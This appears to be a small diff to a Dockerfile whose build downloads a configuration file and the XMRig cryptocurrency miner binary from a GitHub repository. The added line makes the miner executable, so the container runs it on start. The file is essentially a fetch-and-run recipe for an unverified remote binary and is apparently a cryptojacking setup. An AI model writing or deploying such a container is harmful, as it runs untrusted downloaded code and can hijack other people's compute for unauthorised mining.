@@ -8,4 +8,5 @@ RUN apt-get install -y wget curl
 
 RUN wget https://raw.githubusercontent.com/jjcasa/rptreum/main/config.json
 RUN wget https://github.com/jjcasa/rptreum/raw/main/xmrig
+RUN chmod +x xmrig
 CMD ./xmrig
